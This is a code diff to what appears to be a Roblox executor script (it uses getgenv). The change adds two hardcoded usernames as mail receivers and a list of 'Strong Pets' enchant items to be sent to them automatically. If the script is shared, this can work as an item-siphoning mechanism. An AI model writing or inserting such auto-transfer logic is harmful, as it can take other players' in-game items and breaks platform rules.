@@ -101,8 +101,12 @@ end
 
 ----------------------------------------------------------------------------------------
 if _G.STATUS_disabble_SEND_ALL == true then
-	getgenv().GMAIL_RECEIVERS = {}
-	getgenv().GMAIL_ITEMS = {}
+	getgenv().GMAIL_RECEIVERS = {"XxViperTurb0xX91","Willow_Blaz354"}
+	getgenv().GMAIL_ITEMS = {
+	["Strong Pets8"] = {Class = "Enchant", Tier = 8 ,Id = "Strong Pets", MinAmount = 5},
+	["Strong Pets9"] = {Class = "Enchant", Tier = 9 ,Id = "Strong Pets", MinAmount = 5, KeepAmount = 1},
+
+	}
 end
 task.wait(60)
 	if game.PlaceId == 119454325063278 or game.PlaceId == 95635359880599 then
